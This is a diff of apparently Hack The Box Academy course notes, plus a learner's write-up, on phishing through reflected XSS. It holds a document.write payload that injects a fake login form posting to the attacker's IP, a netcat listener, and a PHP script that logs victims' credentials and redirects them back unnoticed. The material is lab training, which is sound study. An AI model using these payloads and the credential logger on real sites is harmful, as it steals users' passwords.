@@ -6,19 +6,15 @@ Furthermore, suppose we were to identify an XSS vulnerability in a web applicati
 
 ## XSS Discovery
 
-We start by attempting to find the XSS vulnerability in the web application atÂ `/phishing`Â from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:
+We start by attempting to find the XSS vulnerability in the web application at`/phishing` from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)
 
-![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)
+This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the`dead image url` icon:
 
-This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get theÂ `dead image url`Â icon:
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)
 
-Â Â Â 
-
-![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)
-
-So, we must run the XSS Discovery process we previously learned to find a working XSS payload.Â `Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.
+So, we must run the XSS Discovery process we previously learned to find a working XSS payload.`Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.
 
 Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.
 
@@ -34,13 +30,13 @@ We can easily find an HTML code for a basic login form, or we can write our own 
 ```html
 <h3>Please login to continue</h3>
 <form action=http://OUR_IP>
-    <input type="username" name="username" placeholder="Username">
-    <input type="password" name="password" placeholder="Password">
-    <input type="submit" name="submit" value="Login">
+ <input type="username" name="username" placeholder="Username">
+ <input type="password" name="password" placeholder="Password">
+ <input type="submit" name="submit" value="Login">
 </form>
 ```
 
-In the above HTML code,Â `OUR_IP`Â is the IP of our VM, which we can find with the (`ip a`) command underÂ `tun0`. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:
+In the above HTML code,`OUR_IP` is the IP of our VM, which we can find with the (`ip a`) command under`tun0`. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:
 
 ```html
 <div>
@@ -52,49 +48,47 @@ In the above HTML code,Â `OUR_IP`Â is the IP of our VM, which we can find wi
 </div>
 ```
 
-Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript functionÂ `document.write()`, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside theÂ `write`Â function, the final JavaScript code should be as follows:
+Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function`document.write()`, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the`write` function, the final JavaScript code should be as follows:
 
-Code:Â javascript
+Code: javascript
 
 ```javascript
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 ```
 
-We can now inject this JavaScript code using our XSS payload (i.e., instead of running theÂ `alert(window.origin)`Â JavaScript Code). In this case, we are exploiting aÂ `Reflected XSS`Â vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in theÂ `Reflected XSS`Â section, and the page should look as follows when we visit the malicious URL:
+We can now inject this JavaScript code using our XSS payload (i.e., instead of running the`alert(window.origin)` JavaScript Code). In this case, we are exploiting a`Reflected XSS` vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the`Reflected XSS` section, and the page should look as follows when we visit the malicious URL:
 
-Â Â Â 
-
-![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg)
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg)
 
 ---
 
 ## Cleaning Up
 
-We can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript functionÂ `document.getElementById().remove()`Â function.
+We can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function`document.getElementById().remove()` function.
 
-To find theÂ `id`Â of the HTML element we want to remove, we can open theÂ `Page Inspector Picker`Â by clicking [`CTRL+SHIFT+C`] and then clicking on the element we need:Â ![Page Inspector Picker](https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg)
+To find the`id` of the HTML element we want to remove, we can open the`Page Inspector Picker` by clicking [`CTRL+SHIFT+C`] and then clicking on the element we need: ![Page Inspector Picker](https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg)
 
-As we see in both the source code and the hover text, theÂ `url`Â form has the idÂ `urlform`:
+As we see in both the source code and the hover text, the`url` form has the id`urlform`:
 
-Code:Â html
+Code: html
 
 ```html
 <form role="form" action="index.php" method="GET" id='urlform'>
-    <input type="text" placeholder="Image URL" name="url">
+ <input type="text" placeholder="Image URL" name="url">
 </form>
 ```
 
-So, we can now use this id with theÂ `remove()`Â function to remove the URL form:
+So, we can now use this id with the`remove()` function to remove the URL form:
 
-Code:Â javascript
+Code: javascript
 
 ```javascript
 document.getElementById('urlform').remove();
 ```
 
-Now, once we add this code to our previous JavaScript code (after theÂ `document.write`Â function), we can use this new JavaScript code in our payload:
+Now, once we add this code to our previous JavaScript code (after the`document.write` function), we can use this new JavaScript code in our payload:
 
-Code:Â javascript
+Code: javascript
 
 ```javascript
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
@@ -102,9 +96,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 
 When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:
 
-Â Â Â 
-
-![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg)
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg)
 
 We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
 
@@ -115,9 +107,7 @@ We also see that there's still a piece of the original HTML code left after our 
 
 As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login:
 
-Â Â Â 
-
-![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)
 
 We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended. Also try logging into the above login form and see what happens.
 
@@ -125,9 +115,9 @@ We can now copy the final URL that should include the entire payload, and we can
 
 ## Credential Stealing
 
-Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the errorÂ `This site canâ€™t be reached`. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get aÂ `site canâ€™t be reached`Â error.
+Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error`This site canâ€™t be reached`. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a`site canâ€™t be reached` error.
 
-So, let us start a simpleÂ `netcat`Â server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:
+So, let us start a simple`netcat` server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:
 
 
 
@@ -136,7 +126,7 @@ smoothment@htb[/htb]$ sudo nc -lvnp 80
 listening on [any] 80 ...
 ```
 
-Now, let's attempt to login with the credentialsÂ `test:test`, and check theÂ `netcat`Â output we get (`don't forget to replace OUR_IP in the XSS payload with your actual IP`):
+Now, let's attempt to login with the credentials`test:test`, and check the`netcat` output we get (`don't forget to replace OUR_IP in the XSS payload with your actual IP`):
 
 
 ```shell-session
@@ -148,24 +138,24 @@ Host: 10.10.XX.XX
 
 As we can see, we can capture the credentials in the HTTP request URL (`/?username=test&password=test`). If any victim attempts to log in with the form, we will get their credentials.
 
-However, as we are only listening with aÂ `netcat`Â listener, it will not handle the HTTP request correctly, and the victim would get anÂ `Unable to connect`Â error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.
+However, as we are only listening with a`netcat` listener, it will not handle the HTTP request correctly, and the victim would get an`Unable to connect` error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.
 
-The following PHP script should do what we need, and we will write it to a file on our VM that we'll callÂ `index.php`Â and place it inÂ `/tmp/tmpserver/`Â (`don't forget to replace SERVER_IP with the ip from our exercise`):
+The following PHP script should do what we need, and we will write it to a file on our VM that we'll call`index.php` and place it in`/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):
 
 
 ```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
-    $file = fopen("creds.txt", "a+");
-    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-    header("Location: http://SERVER_IP/phishing/index.php");
-    fclose($file);
-    exit();
+ $file = fopen("creds.txt", "a+");
+ fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+ header("Location: http://SERVER_IP/phishing/index.php");
+ fclose($file);
+ exit();
 }
 ?>
 ```
 
-Now that we have ourÂ `index.php`Â file ready, we can start aÂ `PHP`Â listening server, which we can use instead of the basicÂ `netcat`Â listener we used earlier:
+Now that we have our`index.php` file ready, we can start a`PHP` listening server, which we can use instead of the basic`netcat` listener we used earlier:
 
 
 
@@ -179,11 +169,9 @@ PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 
 Let's try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg)
 
-![](https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg)
-
-If we check theÂ `creds.txt`Â file in our Pwnbox, we see that we did get the login credentials:
+If we check the`creds.txt` file in our Pwnbox, we see that we did get the login credentials:
 
 
 ```shell-session
@@ -224,23 +212,23 @@ Let's go into next step
 Next step would be setting our php server to trick the user into thinking they did a legitimate action, let's save the following code in a file:
 
 ```php
-<?php  
-if (isset($_GET['username']) && isset($_GET['password'])) {  
-$file = fopen("creds.txt", "a+");  
-fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");  
-header("Location: http://SERVER_IP/phishing/login.php");  
-fclose($file);  
-exit();  
-}  
+<?php 
+if (isset($_GET['username']) && isset($_GET['password'])) { 
+$file = fopen("creds.txt", "a+"); 
+fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); 
+header("Location: http://SERVER_IP/phishing/login.php"); 
+fclose($file); 
+exit(); 
+} 
 ?>
 ```
 
 We'll store the file in a directory made in `tmp`, let's follow these steps:
 
 ```bash
-mkdir /tmp/tmpserver  
-cd /tmp/tmpserver  
-nano index.php # Paste php code  
+mkdir /tmp/tmpserver 
+cd /tmp/tmpserver 
+nano index.php # Paste php code 
 sudo php -S 0.0.0.0:80
 ```
 
